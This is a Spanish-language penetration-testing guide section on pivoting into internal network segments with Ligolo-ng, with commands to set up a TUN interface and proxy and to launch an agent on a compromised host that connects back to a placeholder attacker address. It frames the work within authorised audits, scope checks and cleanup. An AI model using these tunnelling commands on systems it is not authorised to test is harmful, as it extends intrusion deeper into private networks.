# 05.1 Pivoting y Redes Internas con Ligolo-ng

## Objetivo

Una vez comprometido un host con visibilidad a un segmento de red adicional (típico en redes mal segmentadas — ver `sec-infrastructure-evaluation`), extender el alcance de las herramientas de la máquina atacante hacia esa red interna sin necesidad de subir cada herramienta al host pivote.

## Por qué Ligolo-ng frente a otras opciones

| Herramienta | Enfoque | Ventaja / Limitación |
|---|---|---|
| `chisel` | Túnel SOCKS/TCP sobre HTTP | Sencillo, un solo binario, pero gestión manual de proxychains |
| `sshuttle` | VPN sobre SSH | Requiere SSH real en el pivote; transparente a nivel de red |
| **Ligolo-ng** | Interfaz de red virtual (TUN) en la máquina atacante | Tráfico nativo (no requiere `proxychains` delante de cada comando), más rápido, gestiona múltiples rutas/agentes a la vez |
| Metasploit `autoroute` + `socks_proxy` | Integrado en el framework | Cómodo si ya se trabaja en Meterpreter, pero atado al framework |

Ligolo-ng se usa aquí por la combinación de rendimiento (TUN nativo, no SOCKS por proceso) y simplicidad operativa en auditorías con varios pivotes encadenados.

## 1. Preparación en la máquina atacante

```bash
# Crear la interfaz TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Lanzar el proxy (servidor)
./proxy -selfcert
```

## 2. Despliegue del agente en el host pivote

```bash
# Subir el agente compilado para la arquitectura del pivote (ver transferencia de ficheros, 03-Explotacion-y-Shells)
./agent -connect ATACANTE:11601 -ignore-cert
```

## 3. Añadir la ruta hacia la red interna

Desde la consola del proxy (interactiva):

```text
session   # selecciona el agente conectado
start     # inicia el túnel
```

En otra terminal, en la máquina atacante:

```bash
sudo ip route add 10.10.50.0/24 dev ligolo
```

A partir de aquí, cualquier herramienta de la máquina atacante (`nmap`, `curl`, el propio exploit) puede dirigirse directamente a `10.10.50.0/24` como si estuviera en esa red — sin `proxychains` delante.

## 4. Doble pivote (encadenar dos saltos)

Si desde el segmento interno hay un tercer segmento adicional, se repite el proceso: el segundo agente se lanza desde el primer pivote hacia el proxy, y se añade una segunda ruta. Ligolo-ng soporta múltiples agentes simultáneos bajo el mismo proxy, cada uno con su propia tabla de rutas.

## 5. Port forwarding puntual (alternativa ligera a una ruta completa)

Cuando solo se necesita un puerto concreto y no toda la red:

```text
# Desde la consola del agente seleccionado:
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

## Checklist operativo de pivoting

| Paso | Verificación |
|---|---|
| ¿El RoE cubre explícitamente el segmento al que se pivota? | El acceso inicial autorizado no implica automáticamente autorización para todo lo alcanzable desde ahí — confirmar scope antes de escanear el nuevo segmento |
| ¿Se documenta la cadena completa de pivotes? | El informe debe poder reconstruir: host A → segmento B → host C, no solo el resultado final |
| ¿Se limpia el agente/binario subido al finalizar? | Evita dejar artefactos ofensivos olvidados en la infraestructura del cliente |

## Relación con arquitectura de red

El hecho de que el pivoting sea posible en primer lugar es, en la mayoría de los casos, el hallazgo de mayor impacto del informe — más que cualquier CVE individual. Una red con micro-segmentación real (ver el enfoque `internal: true` / redes aisladas documentado en `opsmatrix-lab`) limita drásticamente esta fase, que es exactamente la prueba práctica de si la segmentación declarada en la documentación de red del cliente es real o solo nominal.

## Siguiente paso

Con el alcance ampliado, repetir las fases de `02-Enumeracion-de-Servicios/` y `03-Explotacion-y-Shells/` sobre el nuevo segmento. Al cerrar la auditoría, consolidar todos los hallazgos en `06-Plantillas-y-Reportes/01-Plantilla-PoC-Vulnerabilidad.md`.
